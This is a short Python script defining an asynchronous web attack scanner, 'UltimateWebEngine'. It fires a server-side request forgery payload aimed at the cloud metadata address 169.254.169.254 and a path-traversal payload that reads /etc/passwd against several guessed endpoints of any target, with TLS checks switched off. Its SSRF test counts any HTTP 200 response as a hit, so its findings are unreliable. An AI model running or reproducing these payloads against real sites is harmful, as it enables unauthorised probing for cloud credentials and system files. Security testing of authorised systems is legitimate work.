import asyncio
import aiohttp
class UltimateWebEngine:
    def __init__(self, target_url):
        self.target_url = target_url if target_url.startswith("http") else f"https://{target_url}"
    async def test_ssrf(self, session, endpoint):
        url = f"{self.target_url}{endpoint}?url=http://169.254.169.254/latest/meta-data/"
        try:
            async with session.get(url, timeout=5, ssl=False) as resp:
                text = await resp.text()
                if "ami-id" in text or resp.status == 200:
                    return {"vuln": "SSRF", "endpoint": endpoint}
        except Exception:
            pass
        return None
    async def test_lfi(self, session, endpoint):
        url = f"{self.target_url}{endpoint}?file=../../../../etc/passwd"
        try:
            async with session.get(url, timeout=5, ssl=False) as resp:
                text = await resp.text()
                if "root:x:" in text:
                    return {"vuln": "LFI (Local File Inclusion)", "endpoint": endpoint}
        except Exception:
            pass
        return None
    async def scan(self):
        endpoints = ["/index.php", "/api/fetch", "/view.php", "/download"]
        results = []
        async with aiohttp.ClientSession() as session:
            for ep in endpoints:
                r1 = await self.test_ssrf(session, ep)
                r2 = await self.test_lfi(session, ep)
                if r1: results.append(r1)
                if r2: results.append(r2)
        return results
